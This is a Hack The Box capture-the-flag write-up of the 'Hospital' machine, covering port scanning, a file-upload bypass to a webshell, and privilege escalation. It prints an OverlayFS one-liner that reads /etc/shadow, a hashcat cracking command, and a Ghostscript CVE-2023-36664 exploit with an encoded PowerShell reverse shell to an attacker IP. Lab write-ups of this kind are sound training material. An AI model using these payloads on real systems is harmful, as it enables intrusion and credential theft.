---
title: "Hsopital"
date: 2023-11-22T11:30:03+00:00
tags: ["web","windows","GhostScript"]
categories: ["hackthebox"]
author: "0x0Pwn"
image: "/HTB/Hospital.png"
comments: false
description: "This ip hosts two machines, a linux machine where I entered first and a windows machine on port 443 where I entered last."
---

## Room Information

- Room name: Hospital
- Difficulty level: Medium
- Room link: [https://app.hackthebox.com/machines/hospital](https://app.hackthebox.com/machines/hospital)

![Untitled](/HTB/Hospital.png)

## Tools Used

- Nmap
- crackmapexec
- rccpclient
- smbserver
- smbclient
- searchsploit

## Port Scanning

Other room, other port scan.

```bash
map -p- -sS --open --min-rate 5000 -n -Pn -oG allPorts 10.10.11.241
```

![Untitled](/HTB/1.png)

```bash
nmap -p 22,53,88,135,139,389,443,445,464,593,636,1801,2103,2105,2107,2179,3268,3269,3389,5985,6404,6406,6407,6409,6612,6631,8080,9389,21177 -sCV --min-rate 5000-n -Pn -oN filtered 10.10.11.241
```

![Untitled](/HTB/2.png)

![Untitled](/HTB/3.png)

So the first thing I did as always is to check **smb** ports, ldap, the website and all the subdomains…

## Enumeration

On this machine there was no web page so the only data enumeration I could do was from the smb ports, but I got nothing because even though I was allowed to connect with an anonymous user, I had no permissions to list anything.

The first thing I did was to visit the website and add it to /etc/hosts. After that I could see the main website, which was hosted on port 443 (https) with two different subdomains; DC.hospital.htb and hospital.htb.

![Untitled](/HTB/4.png)

After seeing that these two subdomains led to the same website I tried the typical SQL injection, but nothing worked. So I started to do searches with wfuzz and gobuster of all kinds, and all the time without finding anything relevant.

I left all this aside and continued enumerating the rest of the ports, I tried everything; with the rdp port (without credentials I could not do anything), the rcp port (same as above), ldap and crackmapexec, all failed... 

So going down the nmap scan I saw that there was another web page hosted on port 8080 (http). 

![Untitled](/HTB/5.png)

I found myself in front of another login panel in which I tried again the typical SQL injection statements without result, but in this web there was something different, since it allowed to create an account and then log in.

![Untitled](/HTB/6.png)

I did that and when I logged in it opened a page where I could upload files (the web was programmed in php), so I started to try to upload php files, I tried everything; upload a malicious web.config file, bypass a malicious file in .php by uploading a malicious .htaccess, different double and even triple extensions, also tu inject php shell code to a photo… until when I tried a different php extension called .phar I found an exploit that worked and created a webshell in the browser.

![Untitled](/HTB/7.png)

![Untitled](/HTB/8.png)

## Exploiting

I search the version of kernel ande machine, and I found this exploit to escalate privileges:

```bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;  setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cat /etc/shadow")'
```

![Untitled](/HTB/9.png)

So now I could execute commands on behalf of the user rootasi so I started looking for relevant information, until I found in the /etc/passwd file users like drwilliams and root, then in /etc/shadow I found the hash of the user root and drwilliams. So the next thing I did was to crack the password of root and drwilliams using hascat:

```bash
hashcat -m 1800 -a 0 hash /usr/share/wordlists/rockyou.txt
```

Once I got the password for the drwilliams user I could connect via ssh, it was a linux machine, so I knew I had to connect to a windows one sooner or later.

![Untitled](/HTB/10.png)

![Untitled](/HTB/11.png)

I set out to search for information like crazy through the system, I became root with the following program -> https://github.com/synacktiv/CVE-2023-35001

![Untitled](/HTB/12.png)

After wasting some time with this I decided to try the credentials in the first web that I found hosted in port 443 as the last option, since it was an email web for doctors and the user that was in the machine was called drwilliams.... And it worked, now I had access to the following internal email website between the doctors:

![Untitled](/HTB/13.png)

So I started to see the emails he sent with the rest of the doctors and I discovered a new user, drbrown, who sent him an email talking about the fact that he had to finish the .eps project since he needed it to put it into production and view it with ScriptGhost.

![Untitled](/HTB/14.png)

I started searching drwilliams system for things related to this but I didn't find anything, so I searched on the internet and found a vulnerability for the ScriptGhost program which consisted of creating a malicious .eps. So that's what I did, I created the malicious script and emailed it to him to see what happened, I listened and got the reverse shell as drbrown on the Windows machine now.

The exploit code:

```bash
python3 CVE_2023_36664_exploit.py -g -p "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMgAyADMAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA" -x eps
```

![Untitled](/HTB/15-hospital.png)

## Escalating Privileges

I found that this machine hosted the email web system website, so I uploaded a php cmd to be able to control it as root.

```bash
python3 smbserver.py smbFolder $(pwd) -smb2support
```

![Untitled](/HTB/16-hospital.png)

![Untitled](/HTB/17-hospital.png)

Once at this point, I could execute commands as root and read the root flag 👹